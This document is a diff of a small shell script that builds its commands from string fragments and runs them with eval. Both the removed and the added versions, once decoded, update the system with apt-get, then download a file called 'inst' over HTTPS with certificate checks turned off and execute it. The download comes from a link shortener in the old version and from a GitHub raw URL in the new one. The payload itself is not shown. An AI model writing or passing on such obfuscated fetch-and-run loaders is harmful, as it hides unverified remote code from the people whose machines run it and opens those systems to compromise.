@@ -1,3 +1,3 @@
 z="
-";Az='rm -';Fz='upda';bz='./in';Bz='f in';Jz='ade ';Oz=' --n';Yz='d +x';cz='st';Zz=' ins';Qz='che ';Iz='upgr';Kz='-y';Vz='volt';az='t';Ez='get ';Xz='chmo';Wz='sshx';Tz='kutt';Sz='s://';Pz='o-ca';Uz='.it/';Mz=' -O ';Rz='http';Nz='inst';Cz='st*';Gz='te -';Lz='wget';Hz='y';Dz='apt-';
-eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$z$Dz$Ez$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$z$bz$cz"
+";Rz='http';Vz='om/v';Ez='get ';Cz='st*';Kz='-y';Iz='upgr';Wz='xu00';Mz=' -O ';bz='nst';Gz='te -';Tz='gith';Yz='u/ra';Bz='f in';cz='chmo';Lz='wget';Nz='inst';Sz='s://';Zz='w/ma';Oz=' --n';Dz='apt-';Pz='o-ca';Hz='y';Jz='ade ';Xz='7/vx';Az='rm -';az='in/i';Uz='ub.c';ez=' ins';gz='./in';fz='t';Fz='upda';hz='st';Qz='che ';dz='d +x';
+eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$z$Dz$Ez$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$dz$ez$fz$z$gz$hz"
